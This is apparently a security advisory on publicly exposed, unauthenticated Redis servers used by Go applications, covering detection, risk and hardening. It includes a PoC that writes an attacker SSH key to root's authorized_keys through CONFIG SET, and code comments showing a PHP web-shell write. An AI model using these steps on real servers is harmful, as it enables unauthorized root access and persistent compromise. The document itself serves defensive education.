# Vulnerability Title

Insecure Redis Exposure (redis-exposed)

### Severity Rating

**High** (CVSS 3.x Score typically 7.0-9.8, depending on specific misconfiguration)

### Description

This vulnerability occurs when a Redis instance, often used by Golang applications for caching or data storage, is exposed to the public internet or an untrusted network without proper authentication, encryption, or access controls. This allows unauthorized attackers to access, modify, or delete data stored in Redis, and in many cases, achieve remote code execution (RCE) on the server running the Redis instance.

### Technical Description (for security pros)

An insecurely exposed Redis instance permits unauthenticated and unrestricted access to the Redis database. Attackers can leverage this to:

  * Execute arbitrary Redis commands, including administrative commands like `CONFIG GET` and `CONFIG SET`.
  * Retrieve sensitive data stored in Redis (e.g., session tokens, user data, application configurations).
  * Manipulate application logic by injecting malicious data into Redis.
  * Achieve remote code execution (RCE) through various techniques, such as:
      * Writing SSH public keys to the `authorized_keys` file for SSH access.
      * Writing cron jobs or web shell files to accessible paths on the server.
      * Exploiting known Redis vulnerabilities (e.g., Lua sandbox escapes like CVE-2022-0543, integer overflows) if the Redis version is outdated and vulnerable.
      * Using Redis modules to load malicious shared libraries.

In the context of Golang applications, if the application relies on an exposed Redis instance, the impact extends to the application's data integrity, confidentiality, and availability.

### Common Mistakes That Cause This

  * **Default Configurations:** Running Redis with default settings, which often include no authentication or a default port (6379) accessible to all interfaces.
  * **Lack of Network Segmentation:** Deploying Redis directly accessible from the internet or a broad internal network without firewall rules or network ACLs.
  * **No Password/Weak Password:** Failing to set a strong `requirepass` or using easily guessable passwords for Redis.
  * **Disabling Protected Mode:** Intentionally or unintentionally disabling Redis's `protected-mode`, which prevents connections from outside the loopback interface unless explicitly configured.
  * **Ignoring TLS/SSL:** Not encrypting traffic between the Golang application and the Redis server, making it susceptible to eavesdropping.
  * **Hardcoding Credentials:** Storing Redis credentials directly in source code or insecure configuration files.

### Exploitation Goals

  * Data exfiltration (sensitive data, user information).
  * Data manipulation or corruption.
  * Denial of Service (DDoS) by flushing Redis data or exhausting resources.
  * Remote Code Execution (RCE) on the server hosting Redis.
  * Establishment of persistence (e.g., via cron jobs, SSH keys).
  * Lateral movement within the network.
  * Integration into botnets (e.g., cryptominers, DDoS bots).

### Affected Components or Files

  * Redis server configuration file (`redis.conf`).
  * Golang application code that connects to and interacts with Redis, particularly connection strings or client configurations.
  * System files on the server where Redis is running (e.g., `/etc/crontab`, `~/.ssh/authorized_keys`, web server root directories).

### Vulnerable Code Snippet (Conceptual - Golang)

While the core vulnerability lies in the Redis server configuration, the Golang application's interaction often *assumes* a secure Redis environment. A Golang application might connect like this:

```go
package main

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/go-redis/redis/v8" // Popular Redis client for Go
)

func main() {
	// Vulnerable: Connecting to an unauthenticated/exposed Redis instance
	// In a real scenario, this 'endpoint' would be publicly accessible
	rdb := redis.NewClient(&redis.Options{
		Addr:     "public_ip_or_domain:6379", // Publicly accessible Redis
		Password: "",                         // No password
		DB:       0,                          // Default DB
	})

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	pong, err := rdb.Ping(ctx).Result()
	if err != nil {
		log.Fatalf("Could not connect to Redis: %v", err)
	}
	fmt.Println("Redis connected:", pong)

	// Example of sensitive data being stored
	err = rdb.Set(ctx, "user:123:session_token", "super_secret_token_123", 0).Err()
	if err != nil {
		log.Fatalf("Could not set value: %v", err)
	}
	fmt.Println("Set session token.")

	// An attacker could connect to 'public_ip_or_domain:6379' and issue commands like:
	// `KEYS *` to list all keys
	// `GET user:123:session_token` to retrieve the session token
	// `FLUSHALL` to delete all data
	// `CONFIG SET dir /tmp` and `CONFIG SET dbfilename shell.php` and `SAVE`
	// followed by `SET 1 "\n<?php system($_GET['cmd']); ?>\n"` if web server is on /tmp
}
```

### Detection Steps

1.  **Network Scans:** Use tools like Shodan, Nmap, or Zmap to identify publicly exposed Redis instances on port 6379 (or other non-standard ports).
2.  **Configuration Review:** Manually inspect `redis.conf` files for `bind` directives, `requirepass` settings, and `protected-mode` status.
3.  **Authentication Test:** Attempt to connect to the Redis instance from an external, untrusted network without providing credentials.
    ```bash
    redis-cli -h <redis_host> -p <redis_port>
    ```
    If you get a `PONG` response or can run commands like `INFO` without `AUTH`, it's likely exposed.
4.  **Traffic Analysis:** Monitor network traffic to/from the Redis server for unencrypted communications or connections from unexpected IPs.
5.  **Vulnerability Scanners:** Utilize general network and application security scanners that include checks for exposed services.

### Proof of Concept (PoC)

1.  **Identify Exposed Redis:**
    ```bash
    nmap -p 6379 --script redis-info <target_IP>
    ```
    (Look for unauthenticated access or detailed `INFO` output)
2.  **Connect with `redis-cli`:**
    ```bash
    redis-cli -h <target_IP>
    ```
    If successful, you'll get a `127.0.0.1:6379>` prompt.
3.  **Execute Commands (Example - RCE via SSH key):**
    Assume the Redis server is running as a user that has an SSH directory (e.g., `redis` user or `root`).
    ```
    127.0.0.1:6379> config set dir /root/.ssh/
    OK
    127.0.0.1:6379> config set dbfilename authorized_keys
    OK
    127.0.0.1:6379> set poc_key "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker_key\n"
    OK
    127.0.0.1:6379> save
    OK
    ```
    Now, the attacker can try to SSH into the server using their private key.
    `ssh root@<target_IP>`

### Risk Classification

  * **Confidentiality:** High (sensitive data exposure).
  * **Integrity:** High (data manipulation/corruption).
  * **Availability:** High (DoS possible, e.g., via `FLUSHALL`).
  * **Accountability:** Low (logs might be present, but attribution can be difficult if compromised).

### Fix & Patch Guidance

The primary fix is to secure the Redis instance itself, regardless of the Golang application.

1.  **Network Access Control:** Restrict network access to Redis using firewalls (`ufw`, `iptables`, security groups in cloud environments) to only allow connections from trusted application servers. Bind Redis to specific, non-public IP addresses.
      * In `redis.conf`: `bind 127.0.0.1 <your_app_server_ip>`
2.  **Authentication:** Enable and enforce strong authentication.
      * In `redis.conf`: `requirepass <strong_long_random_password>`
      * For Redis 6.0+, use Access Control Lists (ACLs) for granular permissions.
      * In Golang: `rdb := redis.NewClient(&redis.Options{ Addr: "...", Password: "strong_password", DB: 0, })`
3.  **Encryption (TLS/SSL):** Encrypt communications between the Golang application and Redis using TLS. This often requires setting up a TLS proxy like `stunnel` or using Redis's native TLS support (Redis 6.0+).
      * In `redis.conf` (for native TLS): `tls-port 6380`, `tls-cert-file /path/to/cert.pem`, `tls-key-file /path/to/key.pem`, etc.
      * In Golang (`go-redis` example with TLS):
        ```go
        tlsConfig := &tls.Config{
            MinVersion: tls.VersionTLS12,
            // InsecureSkipVerify: true, // Only for testing, NOT in production!
            // ... load client certs if server requires client auth
        }
        rdb := redis.NewClient(&redis.Options{
            Addr:     "redis_host:6380", // Use TLS port
            Password: "strong_password",
            DB:       0,
            TLSConfig: tlsConfig,
        })
        ```
4.  **Protected Mode:** Ensure `protected-mode yes` is enabled in `redis.conf`.
5.  **Rename/Disable Dangerous Commands:** Rename or disable commands like `FLUSHALL`, `FLUSHDB`, `CONFIG`, `EVAL`, `SLAVEOF` in `redis.conf` if they are not strictly necessary for the application.
6.  **Regular Updates:** Keep Redis server updated to the latest stable version to patch known vulnerabilities (e.g., Lua sandbox escapes).
7.  **Least Privilege:** Configure the Redis server to run with a dedicated, unprivileged user.
8.  **Secure Credential Management:** Use environment variables, secret management services (e.g., AWS Secrets Manager, HashiCorp Vault), or a secure configuration system to manage Redis credentials in Golang applications, avoiding hardcoding.

### Scope and Impact

An insecurely exposed Redis instance can lead to a complete compromise of the data stored within it, potentially leading to:

  * **Loss of sensitive data:** User credentials, PII, financial data, internal secrets.
  * **Application downtime:** Data deletion or corruption can render the application unusable.
  * **System compromise:** Remote code execution can lead to full control over the server hosting Redis, and potentially the entire network.
  * **Reputational damage:** Data breaches can severely impact an organization's trust and reputation.

### Remediation Recommendation

Immediately restrict network access to the Redis instance to only trusted internal IP addresses and application servers. Implement strong authentication with a unique, complex password, and enable TLS encryption for all client-server communication. Regularly review Redis configurations and logs for suspicious activity. Update Redis to the latest stable version.

### Summary

Insecure Redis exposure is a critical vulnerability that can severely impact Golang applications and the underlying infrastructure. It typically arises from misconfigurations, such as public exposure, lack of authentication, or unencrypted communication. Attackers can exploit this to steal, corrupt, or delete data, and even achieve remote code execution. Mitigating this risk requires a multi-layered approach focusing on network access control, robust authentication, encryption, and secure configuration practices for both the Redis server and the Golang application connecting to it.

### References

  * [Redis Security Documentation](https://redis.io/docs/latest/operate/rs/security/recommended-security-practices/)
  * [CVE-2022-0543 (Lua Sandbox Escape in Redis)](https://securityaffairs.com/139164/malware/redigo-malware-targets-redis-servers.html)
  * [Aqua Nautilus Discovers Redigo — New Redis Backdoor Malware](https://www.aquasec.com/blog/redigo-redis-backdoor-malware/)
  * [Go-Redis Client Library](https://github.com/go-redis/redis)
  * [Hacker News Discussion on Redis Security](https://news.ycombinator.com/item?id=10537852)